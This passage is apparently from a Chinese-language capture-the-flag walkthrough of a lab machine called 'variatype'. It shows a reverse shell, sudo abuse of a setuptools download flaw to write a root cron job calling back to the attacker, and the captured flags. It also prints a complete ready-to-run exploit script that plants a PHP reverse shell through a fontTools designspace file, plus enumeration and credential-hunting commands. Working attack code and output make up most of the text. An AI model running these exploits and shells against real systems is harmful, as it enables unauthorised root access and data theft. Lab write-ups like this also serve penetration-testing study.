with zipfile.ZipFile('/tmp/exploit.zip', 'w') as z:
    # 写入一个空文件，文件名是恶意命令
    z.writestr(malicious_name, '')
EOF
www-data@variatype:/tmp/exploit$ python3 /tmp/create_zip.py
python3 /tmp/create_zip.py
www-data@variatype:/tmp/exploit$ ls
ls
www-data@variatype:/tmp/exploit$ ls -l /tmp/exploit.zip
ls -l /tmp/exploit.zip
-rw-r--r-- 1 www-data www-data 206 Mar 22 10:08 /tmp/exploit.zip
www-data@variatype:/tmp/exploit$ cd ..
cd ..
www-data@variatype:/tmp$ ls
ls
create_zip.py
exploit
exploit.zip
systemd-private-64ef60e66d7749ae9691b01f4c624704-systemd-logind.service-3Lvwlb
systemd-private-64ef60e66d7749ae9691b01f4c624704-systemd-timesyncd.service-t82Gji
variabype_uploads
vmware-root
vmware-root_3402-2696945043
www-data@variatype:/tmp$ cp /tmp/exploit.zip /var/www/portal.variatype.htb/public/files/
<oit.zip /var/www/portal.variatype.htb/public/files/
www-data@variatype:/tmp$ tail -f /home/steve/logs/font_pipeline.log
tail -f /home/steve/logs/font_pipeline.log
tail: cannot open '/home/steve/logs/font_pipeline.log' for reading: Permission denied
tail: no files remaining
www-data@variatype:/tmp$ 

```
###  然后监听得到steve的shell
### 并且在/home/steve目录下获得flag：user.txt ：6bbe9a8ff4a7f3986f611d19d41519e5
### 同时得到提权线索：`(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`
```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -vnlp 4444
listening on [any] 4444 ...


connect to [10.10.15.93] from (UNKNOWN) [10.129.244.202] 51416
bash: cannot set terminal process group (4713): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/tmp/ffarchive-4714-1$ 
steve@variatype:/tmp/ffarchive-4714-1$ 
steve@variatype:/tmp/ffarchive-4714-1$ whoami
whoami
steve
steve@variatype:/tmp/ffarchive-4714-1$ sudo -l
sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
steve@variatype:/$ sudo -l
sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
steve@variatype:/$ ls -la /home/steve        
ls -la /home/steve
total 48
drwx------ 8 steve steve 4096 Feb 27 06:16 .
drwxr-xr-x 3 root  root  4096 Dec  5 13:59 ..
lrwxrwxrwx 1 root  root     9 Feb 27 06:16 .bash_history -> /dev/null
-rw-r--r-- 1 steve steve  220 Dec  5 13:59 .bash_logout
-rw-r--r-- 1 steve steve 3526 Dec  5 13:59 .bashrc
drwxr-xr-x 2 steve steve 4096 Dec 13 15:02 bin
drwxr-xr-x 3 steve steve 4096 Dec  7 17:09 .config
drwxr-xr-x 3 steve steve 4096 Dec  7 16:55 .local
drwxr-xr-x 2 steve steve 4096 Dec  7 16:45 logs
drwxr-xr-x 2 steve steve 4096 Mar  9 08:29 processed_fonts
-rw-r--r-- 1 steve steve  807 Dec  5 13:59 .profile
drwxr-xr-x 2 steve steve 4096 Dec 13 15:12 quarantine
-rw-r----- 1 root  steve   33 Mar 23 04:52 user.txt
steve@variatype:/$ cat /home/steve/user.txt
cat /home/steve/user.txt
6bbe9a8ff4a7f3986f611d19d41519e5
steve@variatype:/$ 
```


---
## 提权

### 已经通过`steve@variatype:~$ sudo -l`得到`(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`
### 查看/opt/font-tools/install_validator.py
```shell
steve@variatype:/$ cat /opt/font-tools/install_validator.py
cat /opt/font-tools/install_validator.py
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
steve@variatype:/$ 

```

### 分析下/opt/font-tools/install_validator.py：`setuptools.package_index.PackageIndex.download()` 方法存在**已知安全漏洞
```
setuptools.PackageIndex.download() 在处理 URL 时，
错误地将 URL 路径（经 %2f 解码后）当作本地文件保存路径，
导致攻击者可写入任意文件 → 结合 sudo root 权限 → 任意文件写入 = RCE
```

### 下面是攻击主机上部署的服务脚本
```python
# /tmp/exploit_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class UniversalHandler(BaseHTTPRequestHandler):
    # Payload: cron 反弹 shell 命令
    PAYLOAD = b'* * * * * root bash -c "bash -i >& /dev/tcp/10.10.15.93/6666 0>&1"\n'
    
    def do_GET(self):
        # 不管请求什么路径，都返回 200 + payload
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-length', len(self.PAYLOAD))
        self.end_headers()
        self.wfile.write(self.PAYLOAD)
    
    def log_message(self, format, *args):
        # 静默，避免刷屏
        pass
    
    # 也处理 HEAD 请求（有些库会先发 HEAD）
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-length', len(self.PAYLOAD))
        self.end_headers()

if __name__ == '__main__':
    print(f'[*] Universal exploit server running on port 80')
    print(f'[*] Will return cron payload to ANY request')
    HTTPServer(('0.0.0.0', 80), UniversalHandler).serve_forever()
```
### 运行exploit_server.py
```shell
┌──(kali㉿kali)-[/tmp]
└─$ vim /tmp/exploit_server.py
                                                                                                                                                                
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 /tmp/exploit_server.py

[sudo] password for kali: 
[*] Universal exploit server running on port 80
[*] Will return cron payload to ANY request

```
### 新开终端执行`nc -vnlp 6666`
### 在已经获取的steve shell下执行：
```shell
steve@variatype:/$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.15.93/%2fetc%2fcron.d%2froot_shell'
<y 'http://10.10.15.93/%2fetc%2fcron.d%2froot_shell'
2026-03-23 07:56:07,245 [INFO] Attempting to install plugin from: http://10.10.15.93/%2fetc%2fcron.d%2froot_shell
2026-03-23 07:56:07,259 [INFO] Downloading http://10.10.15.93/%2fetc%2fcron.d%2froot_shell
2026-03-23 07:56:07,637 [INFO] Plugin installed at: /etc/cron.d/root_shell
[+] Plugin installed successfully.
```
### 等待一分钟左右，获取到root shell 以及root.txt： 66e32156a28e987f45dda3449a46a342
```shell
┌──(kali㉿kali)-[~]
└─$ nc -vnlp 6666
listening on [any] 6666 ...
connect to [10.10.15.93] from (UNKNOWN) [10.129.244.202] 38158
bash: cannot set terminal process group (8780): Inappropriate ioctl for device
bash: no job control in this shell
root@variatype:~# whoami
whoami
root
root@variatype:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@variatype:~# ls -la /root
ls -la /root
total 44
drwx------  6 root root 4096 Mar 23 04:52 .
drwxr-xr-x 18 root root 4096 Mar  9 08:29 ..
lrwxrwxrwx  1 root root    9 Feb 27 06:16 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Mar  9 08:29 .cache
drwxr-xr-x  3 root root 4096 Mar  9 08:29 .config
-rw-------  1 root root   20 Mar 10 14:37 .lesshst
drwxr-xr-x  3 root root 4096 Mar  9 08:29 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
lrwxrwxrwx  1 root root    9 Feb 27 06:16 .python_history -> /dev/null
-rw-r-----  1 root root   33 Mar 23 04:52 root.txt
drwx------  2 root root 4096 Mar  9 08:29 .ssh
-rw-r--r--  1 root root  165 Feb 27 06:16 .wget-hsts
root@variatype:~# cat /root/root.txt
cat /root/root.txt
66e32156a28e987f45dda3449a46a342

```
![image.png|1023](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260323200242658.png)

---
# varlib_cve_2025_66034.py:
```python
# varlib_cve_2025_66034.py
# python varlib_cve_2025_66034.py --ip <ATTACKER_IP> --port <ATTACKER_PORT> --path /var/www/mysite.com/public --url http://mysite.com/tools/variable-font-generator/process --trigger http://mysite.com
import argparse
import logging
import requests
import secrets
import string
import subprocess
import threading
import time

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

TARGET_URL = "http://mysite.com/tools/variable-font-generator/process" #change if necessary
DEFAULT_PATH = "/var/www/mysite.com/public" #change if neccessary
TRIGGER_URL = "http://mysite.com" #change if necessary

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

def parse_args():
    parser = argparse.ArgumentParser(description="Varlib fontTools exploit")
    parser.add_argument("--ip", required=True, help="Listener IP")
    parser.add_argument("--port", required=True, type=int, help="Listener port")
    parser.add_argument("--path", default=DEFAULT_PATH, help="Filesystem path to write a shell")
    parser.add_argument("--url", default=TARGET_URL, help="Upload's Form URL")
    parser.add_argument("--trigger", default=TRIGGER_URL, help="URL to trigger the shell")
    parser.add_argument("--no-listen", action="store_true", help="Skip auto listener")
    
    return parser.parse_args()

#create fonts
def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)

    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})

    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()

    glyph = pen.glyph()

    fb.setupGlyf({".notdef": glyph})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "ExploitFont", "styleName": f"Weight{weight}"})

    fb.save(filename)



# Build reverse shell PHP
def build_php(ip, port):
     
    php_code = (
        f'<?php '
        f'$ip="{ip}";'
        f'$port={port};'
        f'$sock=fsockopen($ip,$port);'
        f'$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);'
        f'$proc=proc_open("/bin/bash -i",$descriptorspec,$pipes);'
        f'?>'
    )      
     
    return php_code


# Generate shell name
def gen_shell_name(prefix="shell_", length=8):
    """
    Generate something like shell_ab12cd34.php
    Only [a-z0-9] so it’s safe to drop into single quotes.
    """
    alphabet = string.ascii_lowercase + string.digits
    rand = ''.join(secrets.choice(alphabet) for _ in range(length))
    return f"{prefix}{rand}.php"



# Generate malicious designspace
def generate_designspace(ip, port, target_path, shellname):

    php_payload = build_php(ip, port)

    xml = f"""<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[{php_payload}]]]]><![CDATA[>]]></labelname>
            <labelname xml:lang="fr">PENTEST</labelname>
        </axis>
    </axes>

    <sources>
        <source filename="source-light.ttf" name="Light">
            <location>
                <dimension name="Weight" xvalue="100"/>
            </location>
        </source>
        <source filename="source-regular.ttf" name="Regular">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </source>
    </sources>

    <variable-fonts>
        <variable-font name="MaliciousFont" filename="{target_path}/{shellname}">
            <axis-subsets>
                <axis-subset name="Weight"/>
            </axis-subsets>
        </variable-font>
    </variable-fonts>
</designspace>
"""

    return xml


# Upload the payload
def upload_exploit(xml_payload, url):

    files = [
        ("designspace", ("malicious.designspace", xml_payload, "application/octet-stream")), #change if your upload form is different
        ("masters", ("source-light.ttf", open("source-light.ttf", "rb"), "font/ttf")),
        ("masters", ("source-regular.ttf", open("source-regular.ttf", "rb"), "font/ttf")),
    ]

    headers = {                         #add extra headers if necessary
        "User-Agent": "Mozilla/5.0",
    }

    r = requests.post(url, files=files, headers=headers)

    logging.info(f"[+] Server status: {r.status_code}")
    

def start_listener(port):
    logging.info(f"[+] Starting listener on port {port}...")

    return subprocess.Popen(
        ["nc", "-lvnp", str(port)],
        stdin=None,
        stdout=None,
        stderr=subprocess.DEVNULL
    )


def trigger_shell(shell_name, url):
    """
    Simple HTTP GET to execute the reverse shell payload.
    """
    url = f"{url}/{shell_name}"
    logging.info(f"[+] Triggering shell via {url}")
    try:
        r = requests.get(url, timeout=5)
        logging.info(f"[+] Trigger request status: {r.status_code}")
    except requests.RequestException as e:
        logging.warning(f"[!] Error while triggering shell.. try to trigger manually: {e}")


def main():
     
    args = parse_args()
     
    ip = args.ip
    port = args.port
    path = args.path
    url = args.url
    trigger_url = args.trigger
    
    if not (1 <= port <= 65535):
        sys.exit("[-] Invalid port number")
    
    if port > 10000:
        logging.warning("[!] Ports above 10000 may be blocked by your local firewall. Use ports like 4444, 9001, or 5050.")
    elif port < 1024:
        logging.warning("[!] Ports below 1024 require admin privileges to work as intended")
     
     
    logging.info(f"[+] Generating compatible master fonts...")
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
    
    logging.info(f"[+] Generating shell name...")
    shell_name = gen_shell_name()     
      
    logging.info(f"[+] Using IP address: {ip} and Port Number: {port}")   
    logging.info(f"[+] Using shell name {shell_name}")
    
    logging.info(f"[+] Creating malicious designspace...")
    xml_payload = generate_designspace(ip, port, path, shell_name)

    logging.info(f"[+] Uploading payload...")
    upload_exploit(xml_payload, url)
    
    if not args.no_listen:
        
        try:
            listener_proc = start_listener(port)
            time.sleep(2)  # Give listener time to spin up
            
            trigger_shell(shell_name, trigger_url)
            listener_proc.wait()
            
        except KeyboardInterrupt:
            logging.info(f"[!] Interrupted...")
    else:
        trigger_shell(shell_name, trigger_url)

if __name__ == "__main__":
    main()
```

---
# 常见枚举命令详细总结

---
## **一、基础信息收集**

```bash
# 当前用户与权限
whoami                    # 当前用户名
id                        # UID/GID/组信息
groups                    # 所属组列表

# 系统信息
uname -a                  # 内核版本
cat /etc/os-release       # 系统发行版
hostname                  # 主机名

# 当前路径与环境
pwd                       # 当前工作目录
env | grep -i path        # PATH 环境变量
echo $HOME                # 用户家目录
```

---

##  **二、目录与文件枚举**

### **2.1 浏览关键目录**
```bash
# 根目录结构
ls -la /

# 重点检查目录
ls -la /opt/              # 第三方软件/自定义脚本 🔍
ls -la /home/             # 用户目录 🔍
ls -la /var/www/          # Web 文件 🔍
ls -la /tmp/              # 临时文件/可写目录 🔍
ls -la /root/             # root 目录（通常拒绝访问）
ls -la /etc/cron*         # 定时任务 🔍
```

### **2.2 find 命令高级搜索**
```bash
# 🔍 找可写目录（当前用户）
find / -type d -writable 2>/dev/null | grep -v proc | grep -v sys

# 🔍 找特定用户的文件
find / -user steve 2>/dev/null | head -30

# 🔍 找敏感扩展名文件
find / -name "*.bak" -o -name "*.sh" -o -name "*.py" -o -name "*.conf" 2>/dev/null | grep -v proc

# 🔍 找最近修改的文件（24 小时内）
find / -type f -mmin -1440 2>/dev/null | grep -v proc | head -30

# 🔍 找包含关键词的文件内容
grep -r "password\|secret\|api_key\|token" /opt /home /var 2>/dev/null | head -20

# 🔍 找 SUID/SGID 文件（提权关键）
find / -perm -4000 -type f 2>/dev/null          # SUID（执行时以所有者权限运行）
find / -perm -2000 -type f 2>/dev/null          # SGID（执行时以组权限运行）
find / -user root -perm -4000 -type f 2>/dev/null  # root 的 SUID（最危险）

# 🔍 找可执行文件
find / -type f -executable 2>/dev/null | grep -v proc | head -50
```

### **2.3 文件权限与属性检查**
```bash
# 查看文件详细权限
ls -la /path/to/file

# 查看文件类型
file /path/to/file

# 查看文件内容（前/后 N 行）
head -20 /path/to/file
tail -20 /path/to/file
cat /path/to/file

# 查看文件是否被其他进程使用
lsof /path/to/file 2>/dev/null
```

---

##  **三、用户与权限枚举**

```bash
# 查看所有用户
cat /etc/passwd | grep -v nologin

# 查看用户组
cat /etc/group

# 查看当前用户 sudo 权限
sudo -l

# 查看其他用户的 crontab（需要权限）
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/* 2>/dev/null

# 查看系统 crontab
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null

# 查看历史命令（可能泄露密码）
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

---

##  **四、进程与服务枚举**

```bash
# 查看运行进程
ps aux
ps -ef

# 查看监听端口
netstat -tulpn 2>/dev/null
ss -tulpn 2>/dev/null

# 查看 systemd 服务
systemctl list-units --type=service --state=running

# 查看启动项
ls -la /etc/init.d/
ls -la /etc/systemd/system/
```

---

##  **五、敏感信息搜索**

```bash
# 搜索配置文件中的密码/密钥
grep -r "password\|passwd\|secret\|api_key\|token\|credential" \
    /etc /opt /home /var/www 2>/dev/null | grep -v "Binary"

# 搜索 SSH 密钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# 搜索数据库配置
grep -r "DB_PASSWORD\|DATABASE_URL\|mysql\|postgres" \
    /var/www /opt /home 2>/dev/null

# 搜索备份文件
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

---

##  **六、自动化工具使用**

### **6.1 LinPEAS（推荐）**
```bash
# 下载
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# 运行（快速模式）
./linpeas.sh -q

# 运行（详细模式）
./linpeas.sh -a

# 输出到文件
./linpeas.sh -q > /tmp/linpeas.txt 2>&1

# 关键输出过滤
./linpeas.sh -q | grep -A 3 -B 1 -iE "suid|cron|writable|steve|font|password"
```

### **6.2 Linux Smart Enumeration (LSE)**
```bash
# 下载
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh

# 运行（详细级别 2）
./lse.sh -l 2

# 只显示有趣的结果
./lse.sh -l 2 -i
```

### **6.3 手动快速枚举脚本**
```bash
#!/bin/bash
# quick_enum.sh - 快速提权检查

echo "[*] Current user: $(whoami) ($(id))"
echo "[*] Hostname: $(hostname)"
echo "[*] Kernel: $(uname -r)"
echo ""

echo "[*] SUID files:"
find / -perm -4000 -type f 2>/dev/null | head -10
echo ""

echo "[*] Writable directories:"
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -10
echo ""

echo "[*] Cron jobs:"
cat /etc/crontab 2>/dev/null
ls /etc/cron.d/ 2>/dev/null
echo ""

echo "[*] Users with home:"
cat /etc/passwd | grep -v nologin | cut -d: -f1,6
```

---

## **七、枚举命令速查表**

| 目的 | 命令 | 说明 |
|------|------|--------|
| **找 SUID 文件** | `find / -perm -4000 -type f 2>/dev/null` | 提权关键 |
| **找 SGID 文件** | `find / -perm -2000 -type f 2>/dev/null` | 组权限提权 |
| **找可写目录** | `find / -writable -type d 2>/dev/null \| grep -v proc` | 放置 payload |
| **找特定用户文件** | `find / -user steve 2>/dev/null` | 横向移动线索 |
| **找敏感扩展名** | `find / -name "*.bak" -o -name "*.sh" 2>/dev/null` | 备份/脚本文件 |
| **找最近修改文件** | `find / -type f -mmin -1440 2>/dev/null` | 新部署/配置 |
| **搜索密码关键词** | `grep -r "password\|secret" /etc /opt 2>/dev/null` | 凭证泄露 |
| **查 sudo 权限** | `sudo -l` | 提权捷径 |
| **查定时任务** | `cat /etc/crontab && ls /etc/cron.d/` | 自动执行点 |
| **查监听端口** | `ss -tulpn` | 服务暴露面 |
| **查运行进程** | `ps aux` | 进程权限/漏洞 |

---
